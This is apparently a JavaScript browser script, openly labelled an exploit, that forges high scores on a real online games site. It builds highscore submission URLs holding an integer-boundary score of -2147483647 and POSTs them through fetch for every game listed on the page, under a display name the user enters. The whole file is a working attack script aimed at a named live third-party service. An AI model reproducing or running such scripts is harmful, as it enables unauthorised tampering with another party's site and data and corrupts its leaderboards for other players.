function Exploit() {
    this.createURL = function (game, score, data) {
        let url = `http://www.lutanho.net/stroke/highscores.php?game=${game}&type=${data}&score=${score}`;
        return url;
    };

    this.Game = 'Tetris';
    this.Name = 'Dad';
    this.Location = 'SnowLords Script Extension';
    this.Score = '-2147483647';
    this.Data = 'Exploit Made by Drew Snow';
    this.URL = this.createURL(this.Game, this.Score, this.Data);

    this.sendReq = function () {
        fetch(this.URL, {
            "credentials": "omit",
            "headers": {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "no-cache",
                "content-type": "application/x-www-form-urlencoded",
                "pragma": "no-cache",
                "upgrade-insecure-requests": "1"
            },
            "referrer": this.URL,
            "referrerPolicy": "no-referrer-when-downgrade",
            "body": `name=${this.Name}&countrytown=${this.Location}&isjs=1`,
            "method": "POST",
            "mode": "cors"
        })
            .then(function (data) {
                console.log('Request sent!');
            })
            .catch(function (e) {
                console.error('Error In Request:', e);
            });
    }

    this.Init = function () {
        if (document.location.host == 'www.lutanho.net') {
            let game = document.location.href.match(/\?game=(\w+)/i);
            if (game) {
                this.URL = this.createURL(game[2], this.Score, this.Data);
            }
            this.sendReq();
        } else {
            alert('Please run the script on the new page.');
            document.location.href = 'http://www.lutanho.net';
        }
    };
}

function getMatches(string, regex, index) {
    index || (index = 1);
    var matches = [];
    var match;
    while (match = regex.exec(string)) {
        matches.push(match[index]);
    }
    return matches;
}

let Session = new Exploit();
if (document.location.host === 'www.lutanho.net') {
    Session.Name = prompt('Display Name:', 'Dad');
    //var string = document.body.innerHTML;
    //var expression = /(?:<a href="\.\.\/play\/\w+\.html">)([\w]+)(?:<\/a>)/g;
	//var matches = getMatches(string, expression, 1);
	var matches = document.getElementsByClassName('hs');
    for (let i = 0; i < matches.length; i++) {
		let game = matches[i].href.replace(/(.+\('|'.+)/g, '');
        Session.URL =  Session.createURL(game, Session.Score, Session.Data);
        Session.sendReq();
    }
} else {
    document.location.href = `http://www.lutanho.net/stroke/online.html`;
}

/*
var iframe = document.getElementsByName('play')[0];
var innerDoc = (iframe.contentDocument) ? iframe.contentDocument : iframe.contentWindow.document;
*/
